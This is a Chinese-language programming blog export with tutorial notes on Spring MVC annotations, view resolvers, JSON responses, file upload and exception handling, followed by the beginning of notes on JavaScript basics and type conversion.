<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/id&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">queryUserById</span><span class="params">(<span class="meta">@RequestParam(value = &quot;id&quot;,required = false)</span><span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="RequestBody"><a href="#RequestBody" class="headerlink" title="@RequestBody"></a>@RequestBody</h2><p>作用：用于获取请求体的内容(<strong>不能用于get方法，get方法中没有请求体</strong>)</p>
<p>属性：required:是否必须要有请求体，默认是true</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/body&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">(<span class="meta">@RequestBody(required = false)</span>String body)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="PathVariable"><a href="#PathVariable" class="headerlink" title="@PathVariable"></a>@PathVariable</h2><blockquote>
<p>restful风格的url，可以根据不同的请求方法去执行后台的不同方法</p>
</blockquote>
<p>作用：拥有绑定url中的占位符 ( url中有/delete/{id} ,{id}就是占位符)</p>
<p>属性：value：指定url中的占位符名称     </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/delete/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteUserByUrlId</span><span class="params">(<span class="meta">@PathVariable(value = &quot;id&quot;)</span><span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="RequestHeader"><a href="#RequestHeader" class="headerlink" title="@RequestHeader"></a>@RequestHeader</h2><p>作用：获取指定请求头的值</p>
<p>属性：value：请求头的名称</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHeader</span><span class="params">(<span class="meta">@RequestHeader(value = &quot;Accept&quot;)</span>String header)</span></span>&#123;</span><br><span class="line">    System.out.println(header);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CookieValue"><a href="#CookieValue" class="headerlink" title="@CookieValue"></a>@CookieValue</h2><p>作用：用于获取指定cookie的名称的值</p>
<p>属性：value：cookie的名称</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(path=&quot;/hello&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(<span class="meta">@CookieValue(value=&quot;JSESSIONID&quot;)</span> String cookieValue)</span> </span>&#123;</span><br><span class="line">	System.out.println(cookieValue);</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="响应数据"><a href="#响应数据" class="headerlink" title="响应数据"></a>响应数据</h1><h2 id="返回值分类"><a href="#返回值分类" class="headerlink" title="返回值分类"></a>返回值分类</h2><h3 id="返回字符串"><a href="#返回字符串" class="headerlink" title="返回字符串"></a>返回字符串</h3><p>1.Controller方法返回字符串，根据使用的视图解析器解析为物理视图的地址</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHeader</span><span class="params">(<span class="meta">@RequestHeader(value = &quot;Accept&quot;)</span>String header)</span></span>&#123;</span><br><span class="line">    System.out.println(header);</span><br><span class="line">    <span class="comment">//使用默认的jsp视图解析器，hello.jsp</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    默认的解析jsp的视图解析器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/web/WEB-INF/jsp/&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.jsp&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>配置beetl解析器</strong></p>
<p>更改视图解析器(不能共存)</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;beetlConfig&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">class</span>=<span class="string">&quot;org.beetl.ext.spring.BeetlGroupUtilConfiguration&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">init-method</span>=<span class="string">&quot;init&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;viewResolver&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">&quot;org.beetl.ext.spring.BeetlSpringViewResolver&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    设置字符集 --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;contentType&quot;</span> <span class="attr">value</span>=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> /&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/web/WEB-INF/beetl/&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.html&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>属性文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">DELIMITER_STATEMENT_START=<span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">DELIMITER_STATEMENT_END=--&gt;</span></span><br><span class="line">TEMPLATE_CHARSET=UTF-8</span><br></pre></td></tr></table></figure>

<h3 id="返回ModelAndView"><a href="#返回ModelAndView" class="headerlink" title="返回ModelAndView"></a>返回ModelAndView</h3><ol>
<li>ModelAndView是Spring提供的一个对象，用来调整具体的JSP视图</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回ModelAndView对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/2&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ModelAndView <span class="title">hello2</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span> <span class="keyword">throws</span> JsonProcessingException </span>&#123;</span><br><span class="line">    ModelAndView modelAndView=<span class="keyword">new</span> ModelAndView();</span><br><span class="line">    <span class="comment">//跳转到index.jsp</span></span><br><span class="line">    modelAndView.setViewName(<span class="string">&quot;/web/WEB-INF/jsp/index.jsp&quot;</span>);</span><br><span class="line">    modelAndView.addObject(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;1232&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> modelAndView;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.ModelMap是数据模型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/4&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">hello4</span><span class="params">(ModelMap modelMap, User user, <span class="meta">@RequestParam(required = true)</span>String password, String username)</span> <span class="keyword">throws</span> JsonProcessingException </span>&#123;</span><br><span class="line">    modelMap.addAttribute(<span class="string">&quot;username&quot;</span>,username);</span><br><span class="line">    modelMap.addAttribute(<span class="string">&quot;password&quot;</span>,password);</span><br><span class="line">    <span class="comment">//返回到hello.jsp</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="转发和重定向"><a href="#转发和重定向" class="headerlink" title="转发和重定向"></a>转发和重定向</h2><blockquote>
<p>转发：使用forward关键字进行请求转发，转发的jsp路径，不走视图解析器，需要编写完整的路径</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 转发</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/delete/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">deleteUserByUrlId</span><span class="params">(<span class="meta">@PathVariable(value = &quot;id&quot;)</span><span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;forward:/web/WEB-INF/jsp/index.jsp&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>重定向：redirect</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 重定向</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">* <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/count&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">count</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;count方法执行了...&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;redirect:/add.jsp&quot;</span>;</span><br><span class="line">    <span class="comment">// return &quot;redirect:/user/findAll&quot;;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ResponseBody响应json数据"><a href="#ResponseBody响应json数据" class="headerlink" title="ResponseBody响应json数据"></a>ResponseBody响应json数据</h2><blockquote>
<p>使用@ResponseBody 注解实现将 controller 方法返回对象(javabean)转换为 json 响应给客户端</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-core --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span> 2.8.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;jackson2HttpMessageConverter&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">class</span>=<span class="string">&quot;org.springframework.http.converter.json.MappingJackson2HttpMessageConverter&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;messageConverters&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--               添加消息转化器--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">&quot;jackson2HttpMessageConverter&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用requestBody获得请求体数据</span></span><br><span class="line"><span class="comment"> * 使用responseBody 将javaBean对象转换成json字符串</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">User <span class="title">getUser</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> user;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><blockquote>
<p> SpringMVC框架提供了MultipartFile对象，该对象表示上传的文件，要求变量名称必须和表单file标签的 name属性名称相同</p>
</blockquote>
<blockquote>
<ul>
<li>form表单enctype(表单请求正文类型)取值必须是 ： multipart/form-data</li>
<li>method属性取值为<strong>post</strong></li>
</ul>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="comment">&lt;!--        文件上传--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;/fileUpload&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">名称：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;picname&quot;</span>/&gt;&lt;br/&gt;</span><br><span class="line">图片：&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;uploadFile&quot;</span>/&gt;&lt;br/&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;上传&quot;</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>配置文件解析器</p>
<blockquote>
<p>文件上传的解析器 id 是固定的，不能起别的名称，否则无法实现请求参数的绑定。（不光是文件，其他 字段也将无法绑定）</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;multipartResolver&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.multipart.commons.CommonsMultipartResolver&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 设置最大文件大小(单位KB) --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxUploadSize&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1048576&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/fileupload2&quot;)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">fileUpload2</span><span class="params">(HttpServletRequest request, MultipartFile multipartFile)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;SpringMVC方式的文件上传...&quot;</span>);</span><br><span class="line">       <span class="comment">// 先获取到要上传的文件目录</span></span><br><span class="line">       String path = request.getSession().getServletContext().getRealPath(<span class="string">&quot;/uploads&quot;</span>);</span><br><span class="line">       <span class="comment">// 创建File对象，一会向该路径下上传文件</span></span><br><span class="line">       File file = <span class="keyword">new</span> File(path);</span><br><span class="line">       <span class="comment">// 判断路径是否存在，如果不存在，创建该路径</span></span><br><span class="line">       <span class="keyword">if</span>(!file.exists()) &#123;</span><br><span class="line">           file.mkdirs();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// 获取到上传文件的名称</span></span><br><span class="line">       String filename = multipartFile.getOriginalFilename();</span><br><span class="line">       String uuid = UUID.randomUUID().toString().replaceAll(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>).toUpperCase();</span><br><span class="line">       <span class="comment">// 把文件的名称唯一化</span></span><br><span class="line">       filename = uuid+<span class="string">&quot;_&quot;</span>+filename;</span><br><span class="line">       <span class="comment">// 上传文件</span></span><br><span class="line">       multipartFile.transferTo(<span class="keyword">new</span> File(file,filename));</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><blockquote>
<p>Controller调用service，service调用dao，异常都是<strong>向上抛出</strong>的，最终有<code>DispatcherServlet</code>找异常处理器进行异常的处理</p>
<p>自定义异常错误页面404</p>
</blockquote>
<p><strong>自定义异常</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SysException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SysException</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.message=message;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMessage</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.message = message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>自定义异常处理器</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SysExceptionResolver</span> <span class="keyword">implements</span> <span class="title">HandlerExceptionResolver</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 跳转到具体的错误页面</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelAndView <span class="title">resolveException</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> </span>&#123;</span><br><span class="line">        ex.printStackTrace();</span><br><span class="line">        SysException exception=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (ex <span class="keyword">instanceof</span> SysException)&#123;</span><br><span class="line">            exception=(SysException)ex;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            exception=<span class="keyword">new</span> SysException(<span class="string">&quot;请联系管理员&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ModelAndView modelAndView = <span class="keyword">new</span> ModelAndView();</span><br><span class="line">        modelAndView.addObject(<span class="string">&quot;message&quot;</span>,exception.getMessage());</span><br><span class="line">        modelAndView.setViewName(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> modelAndView;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>配置异常处理器</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    配置异常处理器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;sysExceptionResolver&quot;</span> </span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">&quot;dm.demo.exception.SysExceptionResolver&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>Controller</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 自定义内容显示</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/error-resolver&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">errorTest2</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> SysException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">1</span> / <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> SysException(<span class="string">&quot;不能除以0小老弟啊&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



















]]></content>
      <categories>
        <category>spring</category>
      </categories>
      <tags>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>js</title>
    <url>/2020/09/11/03JavaScript/</url>
    <content><![CDATA[<p>id唯一，name可以相同</p>
<h2 id="一、Js简介"><a href="#一、Js简介" class="headerlink" title="一、Js简介"></a>一、Js简介</h2><p>ECMAScript 6 （发布于 2015 年）是最新的 <a href="https://www.w3school.com.cn/js/js_versions.asp">JavaScript 版本</a>。</p>
<ul>
<li><p>js可以内嵌在html中，是<strong>基于对象</strong>和<strong>事件驱动</strong>的脚本语言</p>
</li>
<li><p><strong>特点</strong>：<strong>交互性</strong>、<strong>安全性</strong>(JS不能访问本地磁盘)、<strong>跨平台性</strong>(浏览器中具备js解析器)</p>
</li>
</ul>
<h4 id="1-1-作用"><a href="#1-1-作用" class="headerlink" title="1.1 作用"></a>1.1 作用</h4><p>（1）动态修改html、css 中的代码</p>
<p>（2）动态校验数据</p>
<h4 id="1-2-组成"><a href="#1-2-组成" class="headerlink" title="1.2 组成"></a>1.2 组成</h4><ul>
<li><p>ECMAScript </p>
</li>
<li><p>BOM浏览器对象模型</p>
</li>
<li><p>DOM文档对象模型</p>
</li>
</ul>
<h4 id="1-3-引入"><a href="#1-3-引入" class="headerlink" title="1.3 引入"></a>1.3 引入</h4><h5 id="（1）内嵌"><a href="#（1）内嵌" class="headerlink" title="（1）内嵌"></a>（1）内嵌</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 内嵌 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;input type=&quot;button&quot; onclick=&quot;alert(&#x27;helloWorld&#x27;)&quot; /&gt; --&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="（2）内部脚本"><a href="#（2）内部脚本" class="headerlink" title="（2）内部脚本"></a>（2）内部脚本</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 内部脚本 --&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- &lt;script type=&quot;text/javascript&quot;&gt;</span></span><br><span class="line"><span class="comment">			alert(&quot;helloword&quot;)</span></span><br><span class="line"><span class="comment">		&lt;/script&gt; --&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="（3）外部脚本"><a href="#（3）外部脚本" class="headerlink" title="（3）外部脚本"></a>（3）外部脚本</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 外部脚本 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js引入.js&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">//js文件</span><br><span class="line">alert(&#x27;helloWorld&#x27;)</span><br></pre></td></tr></table></figure>

<h2 id="二、基本语法"><a href="#二、基本语法" class="headerlink" title="二、基本语法"></a>二、基本语法</h2><blockquote>
<p>​    <strong>变量：var，const,  let</strong></p>
</blockquote>
<h4 id="2-1-原始数据类型"><a href="#2-1-原始数据类型" class="headerlink" title="2.1 原始数据类型"></a>2.1 原始数据类型</h4><p><strong>number</strong>数字类型</p>
<p><strong>string</strong>字符串类型</p>
<p><strong>boolean</strong>布尔类型</p>
<p><strong>null</strong>空类型（Object类型的一种）</p>
<p><strong>undefined</strong>未定义</p>
<p><strong>NaN</strong>:非数字，Not a Number</p>
<p>注意：number/boolean/string是伪对象</p>
<p><strong>typeof</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> v1=<span class="number">1</span>;</span><br><span class="line">alert(v1);</span><br><span class="line">alert(<span class="keyword">typeof</span> v1);</span><br></pre></td></tr></table></figure>

<h4 id="2-2-类型转换"><a href="#2-2-类型转换" class="headerlink" title="2.2 类型转换"></a>2.2 类型转换</h4><ul>
<li>number/boolean–&gt;string : <strong>toString</strong>()</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a=<span class="number">1</span>;</span><br><span class="line">alert(a);</span><br><span class="line">alert(<span class="keyword">typeof</span> a.toString());</span><br><span class="line"><span class="keyword">var</span> a1=<span class="literal">true</span>;</span><br><span class="line">alert(a1);</span><br><span class="line">alert(<span class="keyword">typeof</span> a1.toString())</span><br></pre></td></tr></table></figure>

<ul>
<li><p>string/boolean—&gt;number: <strong>parseInt</strong>()/ <strong>parseFloat</strong>()  <strong>boolean不能转，</strong></p>
<p>可以将数字字符串转换成number 如果“123a3sd5” 转成123</p>
</li>
